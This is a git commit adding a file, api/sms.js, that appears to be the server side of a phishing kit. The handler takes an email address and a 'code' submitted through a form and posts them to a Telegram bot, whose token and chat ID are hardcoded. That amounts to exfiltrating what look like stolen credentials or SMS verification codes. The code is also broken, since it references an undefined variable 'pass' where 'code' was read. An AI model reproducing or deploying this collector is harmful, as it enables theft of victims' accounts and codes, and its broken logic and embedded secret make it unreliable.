10576fb370319a46d6c807cf79833fda71166fa9
riverarentxl-a11y <riverarentxl@gmail.com>
2026-02-01 01:35:52 +0200

    Add files via upload

---
+++ api/sms.js
@@ -0,0 +1,44 @@
+module.exports = async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+
+  const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
+  const chatId = '7687624398';
+
+  try {
+    const { email, code } = req.body;
+
+    const message = `
+📩 NEW FORM
+
+📧 Email: ${email}
+🔑 code: ${pass}
+    `;
+
+    const tgRes = await fetch(
+      `https://api.telegram.org/bot${token}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }
+    );
+
+    const data = await tgRes.json();
+
+    return res.status(200).json({
+      ok: true,
+      telegram: data
+    });
+
+  } catch (err) {
+    return res.status(500).json({
+      error: 'Server error',
+      details: err.message
+    });
+  }
+};
